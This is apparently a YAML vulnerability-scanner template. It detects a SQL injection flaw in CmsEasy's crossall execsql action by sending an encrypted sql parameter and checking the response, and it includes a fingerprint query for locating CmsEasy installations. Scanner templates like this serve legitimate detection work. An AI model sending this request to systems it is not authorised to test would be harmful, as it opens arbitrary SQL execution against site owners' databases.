name: CmsEasy crossall_act.php SQL injection vulnerability
manual: true
query: app="CmsEasy"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK
      headers:
        User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"123")
expression: r0()
detail:
  author: gobysec@gmail.com
  links:
  - https://gobies.org/
  description: CmsEasy 存在SQL注入漏洞，通过文件 service.php 加密SQL语句执行即可执行任意SQL命令
  tags: sqli
